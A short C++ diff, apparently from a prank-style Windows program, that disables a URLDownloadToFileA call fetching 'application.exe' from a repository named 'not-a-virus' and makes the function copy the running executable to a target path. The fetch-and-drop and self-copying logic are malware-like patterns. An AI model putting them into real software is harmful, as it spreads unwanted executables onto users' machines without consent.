@@ -9,9 +9,10 @@ bool downShut;
 bool quitNormally;
 
 void DownloadFile(std::string path, char** argv) {
-    if (URLDownloadToFileA(NULL, (LPCSTR)"https://raw.githubusercontent.com/ethanaobrien/not-a-virus/main/application.exe", path.c_str(), 0, NULL) != S_OK) {
-        CopyFileA((LPCSTR)argv[0], path.c_str(), false);
-    }
+    //if (URLDownloadToFileA(NULL, (LPCSTR)"https://raw.githubusercontent.com/ethanaobrien/not-a-virus/main/application.exe", path.c_str(), 0, NULL) != S_OK) {
+    //    CopyFileA((LPCSTR)argv[0], path.c_str(), false);
+    //}
+    CopyFileA((LPCSTR)argv[0], path.c_str(), false);
 }
 
 void ShutDown() {
